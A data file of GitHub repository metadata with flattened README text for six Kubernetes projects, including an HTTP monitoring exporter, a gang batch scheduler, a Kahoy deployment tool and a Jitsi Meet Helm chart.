kj187,k8s-http-monitoring,http#ingress#kubernetes#service,HTTP Monitoring pipeline https github com kj187 k8s http monitoring workflows pipeline badge svg branch master https github com kj187 k8s http monitoring actions query workflow 3Apipeline Kubernetes Ingress and Service monitoring of HTTP HTTPS requests These application will continuously check your application availability in a specific interval You can check one or multiple endpoints for Ingress or and Service resources Beside a success or fail status this application exposed also the HTTP status code the request duration in seconds and the last execution time of the check itself as a metric endoint which can be scaped by Prometheus Installing Installing via Helm Chart bash git clone https github com kj187 k8s http monitoring git cd http monitoring chart helm upgrade install http monitoring http monitoring Installing via kubectl bash git clone https github com kj187 k8s http monitoring git cd http monitoring kubectl apply f deploy Usage Works with Kubernetes Ingress and Service resources With the Ingress resource you can check the external access and with the Service resource you can check the internal access of you application Add a annotation to one of these resources Example yaml annotation kj187 de http monitoring Root page Or if you want to check multiple endpoints of your application yaml annotation kj187 de http monitoring custeromer area whatever else ENV vars Available ENV vars which could be injected e g via Helm Chart bash MONITORINGINTERVALSECONDS SECONDSASINT default is 30 seconds Metrics The metric endpoint is not available from outside if you need this you have to create a Ingress resource Inside the cluster the endpoint is available under http monitoring metrics metrics Exposed metrics bash httpmonitoringprobesuccess 1 success 0 failed httpmonitoringprobestatuscode HTTP status code httpmonitoringprobedurationseconds Duration of request in seconds httpmonitoringlastexecutiontime Number of seconds since 1970 of last garbage collection All metrics have these lables monitorapp is the name of your application monitornamespace is the namespace where your application lives monitornetwork ingress or service monitorurl the URL of the check Prometheus scraping Prometheus need some information about the http monitoring metric endpoint If you are not using the Prometheus Operator just the normal Prometheus you need the following annotations in the service resource which is already available per default yaml annotations prometheus io scrape true prometheus io path metrics prometheus io port 8080 If you are using the Prometheus Operator just create a new ServiceMonitor resource yaml apiVersion monitoring coreos com v1 kind ServiceMonitor metadata name http monitoring servicemonitor labels prometheus kube prometheus spec jobLabel app targetLabels app namespaceSelector any true selector matchLabels prometheus operator scrape default endpoints port metrics interval 10s Now Prometheus should scrape the http monitoring metrics continuously Self check To check if the http monitoring application itself works properly you can check the httpmonitoringlastexecutiontime metric which exposed a unix timestamp of the latest execution time If you are not using the Prometheus Operator create a new file called prometheusvalues yaml and add the following content serverFiles alertingrules yml groups name http monitoring rules alert HttpMonitoringChecksAreOlderThan1Day expr httpmonitoringlastexecutiontime time 86400 for 10m labels severity high annotations summary HTTP monitoring checks are older than 1 day urgency high Now you have to update your Prometheus Helm chart helm upgrade prometheus stable prometheus f prometheusvalues yaml If you are using the Prometheus Operator just add the following new PrometheusRule resource yaml apiVersion monitoring coreos com v1 kind PrometheusRule metadata name http monitoring rules labels prometheus kube prometheus release Release Name cronjob http monitoring rules spec groups name http monitoring rules alert HttpMonitoringChecksAreOlderThan1Day expr httpmonitoringlastexecutiontime time 86400 labels severity high annotations summary HTTP monitoring checks are older than 1 day urgency high,2020-04-17T13:04:02Z,2020-07-28T14:14:02Z,Go,User,1,22,0,10,master,kj187,1,0,0,2,5,0,0
tenstack,batch-scheduler,,Batch scheduler Background Currently through the default scheduler of Kubernetes we cannot ensure a group of pods scheduled at the same time Under some scene it would waste resources since some pods need work together like spark tensorflow and so on So batch scheduler is aimed at solving the issue Method Features lightweight no resource race gang scheduling Implementation Based on the latest scheduling framework https kubernetes io docs concepts scheduling eviction scheduling framework we designed the scheduler So only one scheduler is needed to run in the cluster which makes sure resource race would not happen This scheduler also makes sure gang scheduling e g scene1 A group consists of 5 pods The batch scheduler would not schedule any pod until enough resources are found scene2 Only 6 cpu exist in the cluster Two groups require 5 cpus and 5 cpus are submitted then only one and at least one group would be scheduled How to keep light weight We named a CRD PodGroup pkg apis podgroup v1 types go When we would to running a group of pods just need submit a PodGroup e g group1 into the cluster The pods needs to run as a group should only add a label named group batch scheduler tencent com group1 Main Progress 1 PreFilter Compute resource requirements before we start predicts for a pod If a pod is not permitted we add it to freeze cache then the pods belong to the same group would be rejected directly 2 Less this interface decides the sequence of pods Currently pods having higher Priority would be scheduled first If pods have same the priority PodGroup Creation time would be compared 3 Permit it is used for approving a pod or denying one If a pod can be scheduled but the number of pods belongs to the same group has not reached the min requested it returns Wait If a pod cannot be scheduled it returns Unschedulable 4 It is better to set MaxScheduleTime for a PodGroup If one of the pods belong to the same PodGroup times out other pods would also be rejected Build git clone git github com tenstack batch scheduler git make build Deploy Deploy CRD cd deploy kubectl apply f deploy crd yaml Configuration Default config has been written but kubeconfig in it should be changed to your self stored Deploy batch scheduler xslt cd deploy bash start sh Example This example shows the resource race scene Only 8 cpu exist in the cluster and 0 9 has been occupied xslt Allocated resources Total limits may be over 100 percent i e overcommitted Resource Requests Limits cpu 900m 11 0 0 memory 140Mi 0 340Mi 2 ephemeral storage 0 0 0 0 Events Yaml file named sts group valid race yaml is as follow xslt apiVersion batch scheduler tencent com v1 kind PodGroup metadata name group1 namespace default spec minMember 5 apiVersion batch scheduler tencent com v1 kind PodGroup metadata name group2 namespace default spec minMember 5 apiVersion apps v1 kind StatefulSet metadata name web group race1 spec selector matchLabels app nginx podManagementPolicy Parallel serviceName nginx replicas 5 template metadata labels group batch scheduler tencent com group1 app nginx type node spec containers name nginx image nginx ports containerPort 80 name web resources limits cpu 1 requests cpu 1 apiVersion apps v1 kind StatefulSet metadata name web group race2 spec selector matchLabels app nginx podManagementPolicy Parallel serviceName nginx replicas 5 template metadata labels group batch scheduler tencent com group2 app nginx type node spec containers name nginx image nginx ports containerPort 80 name web resources limits cpu 1 requests cpu 1 Submit it xslt kubectl apply f sts group valid race yaml Results xslt root cwd dev kubectl get pod NAME READY STATUS RESTARTS AGE web group race1 0 0 1 ContainerCreating 0 16s web group race1 1 0 1 ContainerCreating 0 16s web group race1 2 0 1 ContainerCreating 0 16s web group race1 3 1 1 Running 0 16s web group race1 4 0 1 ContainerCreating 0 16s web group race2 0 0 1 Pending 0 16s web group race2 1 0 1 Pending 0 16s web group race2 2 0 1 Pending 0 16s web group race2 3 0 1 Pending 0 16s web group race2 4 0 1 Pending 0 16s,2020-08-04T08:38:25Z,2020-11-11T02:26:58Z,Go,Organization,3,21,4,3,master,cwdsuzhou#hustcat,2,0,0,1,0,0,1
mingcheng,deploy-k8s-within-aliyun-mirror,,Kubernetes Linux linux Docker docker Kubernetes kubernetes Kubernetes kubernetes Dashboard dashboard Kubernetes K8S Linux DockerK8S Linux Debian CentOS Debian source list etc apt sources list kubernetes list etc apt sources list d kubernetes list apt update y apt upgrade y K8S etc sysctl conf net bridge bridge nf call iptables 1 net bridge bridge nf call ip6tables 1 net ipv4 ipforward 1 net ipv4 tcptwrecycle 0 net ipv4 neigh default gcthresh1 1024 net ipv4 neigh default gcthresh1 2048 net ipv4 neigh default gcthresh1 4096 vm swappiness 0 vm overcommitmemory 1 vm paniconoom 0 fs inotify maxuserinstances 8192 fs inotify maxuserwatches 1048576 fs file max 52706963 fs nropen 52706963 net ipv6 conf all disableipv6 1 net netfilter nfconntrackmax 2310720 Docker Debian Docker sudo apt install docker docker compose daemon json registry mirrors https mirror aliyuncs com Docker systemctl enable docker docker info Kubernetes K8S bash apt get update y apt get install y apt transport https gnupg curl https mirrors aliyun com kubernetes apt doc apt key gpg apt key add apt get install y kubelet kubeadm kubectl kubeadm version init default yaml yaml imageRepository registry cn hangzhou aliyuncs com googlecontainers networking podSubnet 10 100 0 1 24 Pod Calico kubeadm init config init default yaml config kubeadm config print init defaults upload certs https kubernetes io docs setup production environment tools kubeadm high availability The upload certs flag is used to upload the certificates that should be shared across all the control plane instances to the cluster kubeadm init upload certs config init default yaml nodes kubeadm join kubeadm join kubeadm token create print join command via https github com kubernetes kubeadm issues 659 issuecomment 357726502 kubectl get nodes A kubectl get pod A o wide K8S K8S Flannel Calico Calico 192 168 0 0 24 init default yaml Pods 10 100 0 1 24 name CALICOIPV4POOLCIDR value 10 100 0 1 24 https www projectcalico org kubectl apply f calico yaml Pods CoreDNS for p in kubectl get pods namespace kube system l k8s app kube dns o name do kubectl logs namespace kube system p done taint kube system namespace Pod kubectl taint nodes all node role kubernetes io master DNS dnsutils Pod kube system namespce kubectl apply f dnsutils yaml Pod Ready kubectl exec it dnsutils cat etc resolv conf kubectl exec it dnsutils nslookup kubernetes default Kubernetes Node kubeadm join kubelet nginx kubectl apply f nginx yaml port forward NodePort Dashboard admin role yaml admin token kubectl apply f admin role yaml admin token TOKENNAME kubectl n kube system get secret grep admin token awk print 1 kubectl n kube system get secret TOKENNAME o jsonpath data token base64 d Dashboard dashboard yaml https kubernetes io docs tasks access application cluster web ui dashboard admin role yaml token apt K8S 1 18 Istio 1 5 2 https github com istio istio issues 22215 issuecomment 599665040 http ljchen net 2018 10 23 E5 9F BA E4 BA 8E E9 98 BF E9 87 8C E4 BA 91 E9 95 9C E5 83 8F E7 AB 99 E5 AE 89 E8 A3 85kubernetes https github com kubernetes kubernetes issues 56038 https pkg go dev k8s io kubernetes cmd kubeadm app apis kubeadm v1beta2 tab doc https cloud tencent com developer article 1482739 https juejin im post 5dde7e4be51d4505f45f2495 https juejin im post 5dde7e4be51d4505f45f2495 https www lijiaocn com E9 A1 B9 E7 9B AE 2017 04 11 calico usage html,2020-04-26T03:19:18Z,2020-12-14T01:56:41Z,n/a,User,1,21,5,9,master,mingcheng,1,0,0,0,0,0,0
slok,kahoy,ci#continuous-integration#deploy#deployment#k8s#kubectl#kubernetes#kubernetes-deployment#manifests#ship#yaml,Kahoy easy and reliable Kubernetes manifest deployments When Kubectl is too simple and available deployment solutions too complex Docs Releases Docker images docker images Main features Simple flexible and lightweight A single CLI Deploy any kind of Kubernetes resource core resources CRDs Reliable Garbage collection Adapts to any type of Kubernetes manifest structure a single YAML few manifests big manifest repository Use to deploy as individual releases services Helm style or group of manifest repository Flux style Gitops ready apply only changed resources diff dry run Multiple resource filtering options file paths resource namespace types Reports of what applies and deletes useful to combine with other apps e g wait checks notifications Getting started Check concepts docs concepts docs and start deploying any kind of Kubernetes resources bash Dry run kahoy apply dry run kube provider id ci n manifests Diff changes kahoy apply diff kube provider id ci n manifests Deploy kahoy apply kube provider id ci n manifests Get more information on the docs website Contributing Check CONTRIBUTING md CONTRIBUTING md file kubectl https kubernetes io docs reference kubectl overview concepts docs https docs kahoy dev topics concepts docs http docs kahoy dev releases https github com slok kahoy releases docker images https hub docker com r slok kahoy,2020-08-03T18:21:25Z,2020-12-28T10:02:28Z,Go,User,3,21,0,326,master,slok#jesusvazquez,2,3,3,3,63,0,133
leoberbert,cluster-dev-k8s,,Cluster K8S com NFS Este projeto tem como objetivo criar um cluster k8s com NFS Network File System para estudos utilizando o vagrant Ser o criadas 4 mquinas sendo elas master Mquina master do cluster k8s minion1 N 1 do cluster k8s minion2 N 2 do cluster k8s storage Servidor NFS Network File System Pr Requisitos Vagrant https www vagrantup com docs installation VirtualBox https www virtualbox org wiki Downloads Passo a Passo da instala o git clone https github com leoberbert cluster dev k8s git cd cluster dev k8s Agora basta executar o comando abaixo e aguardar todo o ambiente ser criado vagrant up Aps o trmino iremos verificar se nosso ambiente encontra se criado e pronto para utiliza o Mapa de IP Host 172 27 11 10 master 172 27 11 20 minion1 172 27 11 30 minion2 172 27 11 40 storage Acessem a mquina master para verificarmos se o cluster encontra se funcionando vagrant master vagrant kubectl get nodes NAME STATUS ROLES AGE VERSION master Ready master 5d1h v1 18 3 minion1 Ready 5d1h v1 18 3 minion2 Ready 5d1h v1 18 3 Nas mquinas minion1 e minion2 precisaremos montar o disco para trabalhar com o NFS e gravar os arquivos na mquina storage vagrant minion1 sudo mount t nfs 172 27 11 40 volumes v1 mnt vagrant minion2 sudo mount t nfs 172 27 11 40 volumes v1 mnt Iremos criar um arquivo nas mquinas minion1 e minion2 e verificar se o arquivo ser armazenado na maquina storage vagrant minion1 mnt cd mnt sudo touch minion1 ls lrt total 0 rw r r 1 root root 0 Jun 12 19 51 minion1 vagrant minion2 cd mnt sudo touch minion2 ls lrt total 0 rw r r 1 root root 0 Jun 12 19 51 minion1 rw r r 1 root root 0 Jun 12 19 52 minion2 Note que quando executei o comando na maquina minion2 j foi exibido o arquivo criado na mquina minion1 Na mquina storage acessaremos o diretrio montado anteriormente vagrant storage cd volumes v1 vagrant storage volumes v1 ls lrtF total 0 rw r r 1 root root 0 Jun 12 19 51 minion1 rw r r 1 root root 0 Jun 12 19 52 minion2 vagrant storage volumes v1 Com este cluster montado ser possivel realizarem seus estudos no k8s e tambm realizar o desenvolvimento de aplicaes,2020-06-12T19:06:35Z,2020-12-25T18:43:26Z,Shell,User,1,20,8,3,master,leoberbert,1,0,0,0,0,0,0
taktakpeops,jitsi-meet-helm,helm#helm-chart#jitsi#jitsi-meet#k8s#kubernetes,Jitsi Meet A Jitsi Meet https jitsi org jitsi meet Chart for Kubernetes Install chart To download and to install the Jitsi Meet Chart make sure that you have the Helm CLI v2 installed and clone this repository on your machine Once done you can find some examples here jitsi meet examples To install the chart in your terminal go to the jitsi meet helm repository and run the following command bash helm install namespace MYNAMESPACE n jitsi meet jitsi meet f jitsi meet examples basic values yaml wait MYNAMESPACE should be replaced by the namespace you want to use for Jitsi Meet It assumes that you have a Nginx Ingress https docs nginx com nginx ingress controller overview controller and you use CertManager https cert manager io docs installation kubernetes along with ACME https cert manager io docs configuration acme issuer type for managing the HTTPS certificates Because wait flag the status will be given once Jisti Meet is ready Updating the chart To update the chart in your terminal go to the jitsi meet helm repository and run the following command bash helm upgrade jitsi meet jitsi meet f jitsi meet examples basic values yaml namespace MYNAMESPACE wait MYNAMESPACE should be replaced by the namespace you want to use for Jitsi Meet Delete the chart To delete the chart in your terminal go to the jitsi meet helm repository and run the following command bash helm delete purge jitsi meet Demo Currently the aws example is running on jitsi project meat tk https jitsi project meat tk Feel free to give it a try and share your feedback Warnings This chart is still an experiment it runs currently one replica of each component Work needs to be done for writing route tables for the ingress to route UDP TCP JVB service uses a NodePort type for routing UDP outside of the cluster The chart was tested on AWS and local Kubernetes cluster ONLY no ingress kubectl port forward ngrok to the rescue The prosody deployment deploys both jicofo and prosody in one pod in order to use jicofo as a sidecar container maybe not wise Configuration The following table lists the configurable parameters of the Jitsi Meet chart and their default values Parameter Description Default image pullSecrets Image pull secrets nil jicofo image repository Image repository jitsi jicofo jicofo image tag Image tag latest jicofo image pullPolicy Image pull policy Always jicofo environment Additional environment variables jicofo componentSecret Base64 encoded component secret nil jicofo userAuth enabled Enabled authentication false jicofo userAuth name Username for authentication focus jicofo userAuth secret Secret for authentication nil jicofo resources Pod resources jvb image repository Image repository jitsi jvb jvb image tag Image tag latest jvb image pullPolicy Image pull policy Always jvb replicaCount Replica count 1 jvb environment Additional environment variables jvb securityContext fsGroup Security context deployment 412 jvb service annotations Service annotations jvb service type Service type NodePort jvb service externalTrafficPolicy External traffic policy Cluster jvb ingress enabled Yet to come ingress UDP TCP false jvb resources Pod resources jvb nodeSelector Node selector jvb affinity Node affinity jvb tolerations Node tolerations jvb userAuth enabled Enabled authentication false jvb userAuth name Username for authentication focus jvb userAuth secret Secret for authentication nil prosody image repository Image repository jitsi prosody prosody image tag Image tag latest prosody image pullPolicy Image pull policy Always prosody environment Additional environment variables prosody replicaCount Replica count 1 prosody service annotations Service annotations prosody service type Service type ClusterIP prosody service sessionAffinityConfig clientIPConfig Timeout client IP 10800 prosody hpa enabled Yet to come horizontal pod autoscaler false prosody resources Pod resources prosody nodeSelector Node selector prosody affinity Node affinity web tolerations Node tolerations web image repository Image repository jitsi prosody web image tag Image tag latest web image pullPolicy Image pull policy Always web environment Additional environment variables web replicaCount Replica count 1 web hpa enabled Yet to come horizontal pod autoscaler false web service annotations Service annotations web service type Service type ClusterIP web service port Service port 80 web ingress enabled Yet to come ingress UDP TCP false web resources Pod resources web nodeSelector Node selector web affinity Node affinity web tolerations Node tolerations web ingress enabled Ingress controller false web ingress annotations Ingress annotations web ingress hosts Ingress host configuration web ingress tls TLS for ingress controller ingressControllerNamespace Yet to come namespace ingress nil serviceAccount create Create service account true serviceAccount name Service account name nil podSecurityContext Pod Security context except JVB securityContext Security context Help For any assistance needed please open an issue Contributing In case you notice an issue or want to implement some improvements feel free to open an issue describing your finding and or to open a pull request,2020-04-16T08:07:15Z,2020-12-26T08:21:46Z,Lua,User,6,20,5,12,master,taktakpeops,1,0,0,1,0,0,0
